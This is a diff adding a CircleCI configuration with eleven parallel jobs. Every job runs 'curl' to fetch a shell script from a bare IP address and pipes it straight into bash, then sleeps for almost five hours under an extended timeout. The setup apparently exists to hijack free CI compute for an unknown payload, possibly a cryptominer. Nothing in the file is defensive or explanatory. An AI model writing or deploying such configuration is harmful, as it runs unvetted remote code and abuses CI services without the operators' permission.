@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  pybuolre:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 3482"
+            no_output_timeout: 8h
+
+  pybuolre1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 6452"
+            no_output_timeout: 8h
+
+  pybuolre2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 33482"
+            no_output_timeout: 8h
+
+  pybuolre3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 4582"
+            no_output_timeout: 8h
+
+  pybuolre4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 34632"
+            no_output_timeout: 8h
+
+  pybuolre5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 34824563"
+            no_output_timeout: 8h
+
+  pybuolre6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 348463"
+            no_output_timeout: 8h
+
+  pybuolre7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 3486342"
+            no_output_timeout: 8h
+
+  pybuolre8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 3342482"
+            no_output_timeout: 8h
+
+  pybuolre9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 343482"
+            no_output_timeout: 8h
+
+  pybuolre10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://54.179.182.247/aa.sh | bash -
+      - run: 
+            command: sleep 17980; echo "Hola 34263482"
+            no_output_timeout: 8h
+
+workflows:
+  main:
+    jobs:
+      - pybuolre
+      - pybuolre1
+      - pybuolre2
+      - pybuolre3
+      - pybuolre4
+      - pybuolre5
+      - pybuolre6
+      - pybuolre7
+      - pybuolre8
+      - pybuolre9
+      - pybuolre10
